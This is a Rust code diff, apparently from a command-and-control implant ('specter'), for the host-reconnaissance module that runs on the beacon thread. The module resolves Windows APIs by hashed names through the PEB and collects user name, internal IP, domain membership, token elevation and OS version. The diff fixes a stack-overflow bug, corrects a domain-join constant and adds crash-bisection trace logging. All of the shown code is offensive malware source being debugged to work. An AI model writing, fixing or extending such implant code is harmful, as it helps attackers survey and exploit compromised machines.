@@ -36,14 +36,17 @@ const H_GET_MODULE_FILE_NAME_A: u64 = fnv1a64(b"GetModuleFileNameA");
 const H_RTL_GET_VERSION: u64 = fnv1a64(b"RtlGetVersion");
 const H_GET_TIME_ZONE_INFORMATION: u64 = fnv1a64(b"GetTimeZoneInformation");
 
-/// Partial OSVERSIONINFOW: size(+0), major(+4), minor(+8), build(+0xC).
+/// Partial OSVERSIONINFOW: RTL_OSVERSIONINFOW is 276 bytes (size(+0),
+/// major(+4), minor(+8), build(+0xC), szCSDVersion[128] u16 from +0x14).
+/// The full 276 bytes are declared so an implementation that writes the
+/// CSD string cannot smash the surrounding stack.
 #[repr(C)]
 pub struct VersionInfo {
     pub size: u32,
     pub major: u32,
     pub minor: u32,
     pub build: u32,
-    _rest: [u8; 0xE8 - 0x10],
+    _rest: [u8; 276 - 0x10],
 }
 
 /// Collected identity, stored on the instance (stack-resident buffers).
@@ -119,12 +122,14 @@ const SYSINFO_DEFAULT: SysInfo = SysInfo {
 };
 
 /// Collect the identity. Failure of any single API leaves its field at
-/// the default — never fatal.
+/// the default — never fatal. `dbg` is the bootstrap debug handle (0/-1
+/// disabled): the sub-stage trace localizes a crash inside this block
+/// (iteration 15 bisection).
 ///
 /// # Safety
 ///
 /// Runs on the beacon thread after module resolution; PEB valid.
-pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
+pub unsafe fn collect(peb: *mut Peb, dbg: isize) -> SysInfo {
     let mut info = SysInfo::empty();
     let kernel32 = specter_core::peb::find_module(peb, H_KERNEL32);
     let advapi32 = specter_core::peb::find_module(peb, H_ADVAPI32);
@@ -206,6 +211,7 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
             }
         }
     }
+    crate::runtime::debug::log_handle(dbg, b"si: base ok\n");
 
     // GMT offset: Bias is the first i32 of TIME_ZONE_INFORMATION
     // (172 bytes = 86 u16; only the first word pair is read).
@@ -224,6 +230,7 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
             }
         }
     }
+    crate::runtime::debug::log_handle(dbg, b"si: tz ok\n");
 
     if !advapi32.is_null() {
         let p = export(advapi32, H_GET_USER_NAME_A);
@@ -240,6 +247,7 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
             }
         }
     }
+    crate::runtime::debug::log_handle(dbg, b"si: user ok\n");
 
     // Internal IP: first non-loopback IPv4 of the address table
     // (iphlpapi GetIpAddrTable, loaded on demand). dwAddr is stored raw —
@@ -296,6 +304,7 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
             }
         }
     }
+    crate::runtime::debug::log_handle(dbg, b"si: adapters ok\n");
 
     // Joined domain: NetGetJoinInformation (netapi32, loaded on demand) —
     // empty in a workgroup, the NetBIOS name of the joined domain
@@ -340,7 +349,7 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
                 let mut name_buf: *mut u16 = core::ptr::null_mut();
                 let mut status: u32 = 0;
                 if get_join(core::ptr::null(), &mut name_buf, &mut status) == 0
-                    && status == 2 // NETSETUP_DOMAIN: joined to a domain
+                    && status == 3 // NETSETUP_DOMAIN_NAME: joined to a domain
                     && !name_buf.is_null()
                 {
                     // Bounded wide read, then OEM/ACP conversion.
@@ -366,6 +375,7 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
             }
         }
     }
+    crate::runtime::debug::log_handle(dbg, b"si: join ok\n");
 
     // Elevation: TokenElevation of the process token (advapi32; the module
     // is already in the PEB whenever the identity block above resolved
@@ -393,6 +403,7 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
             }
         }
     }
+    crate::runtime::debug::log_handle(dbg, b"si: elev ok\n");
 
     // OS version via RtlGetVersion (ntdll, already resolved by the caller
     // through the bootstrap; re-resolve through the PEB for isolation).
@@ -406,7 +417,7 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
                 major: 0,
                 minor: 0,
                 build: 0,
-                _rest: [0; 0xE8 - 0x10],
+                _rest: [0; 276 - 0x10],
             };
             let ok = (core::mem::transmute::<
                 *const core::ffi::c_void,
@@ -419,5 +430,6 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
             }
         }
     }
+    crate::runtime::debug::log_handle(dbg, b"si: os ok\n");
     info
 }
